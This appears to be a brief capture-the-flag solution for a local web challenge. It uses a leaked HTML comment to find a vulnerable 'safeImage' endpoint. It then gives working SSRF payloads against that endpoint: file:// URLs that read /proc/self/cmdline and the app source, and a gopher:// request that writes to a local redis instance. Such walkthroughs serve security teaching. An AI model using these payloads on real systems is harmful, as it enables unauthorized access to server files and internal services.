# Solution

1.  Check out the source.  

```
<!-- 
    
    TODO: 
        * Move redis to it's own server.
        * Update the docker server status page.
        * fix some "safeImage" rendering bugs
    -->
```

Now we know there is redis on the server.  We know this is inside of a docker container and we know there are a few bugs around `safeImage`.

2. view-source:http://localhost:5000/safeImage/?url=file:///proc/self/cmdline
3. You can see the application
  ```view-source:http://localhost:5000/safeImage/?url=file:///app/app.py```
4. You have arbitrary write 
  ```http://localhost:5000/safeImage/?url=gopher://127.0.0.1:6379/_set%20aaa%20test```
